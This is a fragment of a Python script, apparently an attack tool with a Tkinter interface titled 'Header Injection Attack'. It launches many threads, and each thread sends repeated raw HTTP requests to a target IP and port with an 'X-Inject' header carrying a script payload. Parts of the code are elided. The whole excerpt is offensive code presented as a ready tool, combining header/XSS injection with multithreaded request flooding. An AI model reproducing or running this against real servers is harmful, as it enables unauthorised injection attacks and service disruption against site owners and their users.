...
def inject_thread(output, thread_id):
    packet_count = 0
    try:
        while packet_count < REQUESTS_PER_THREAD and not stop_event.is_set():
            ...
            payload = b"GET / HTTP/1.1\r\nHost: test.com\r\nX-Inject: <script>alert('hacked')</script>\r\n\r\n"
            sock.send(payload)
            sock.close()
            packet_count += 1
...
def run_attack(output):
    ...
    output.insert(tk.END, f"[*] Starting Header Injection Attack on {TARGET_IP}:{PORT}...\n")
    threads = []
    stop_event.clear()
    start_time = time.time()
    for i in range(NUM_THREADS):
        t = threading.Thread(target=inject_thread, args=(output, i))
        t.daemon = True
        t.start()
        threads.append(t)
    time.sleep(10)
...
root = tk.Tk()
root.title("Header Injection Attack")
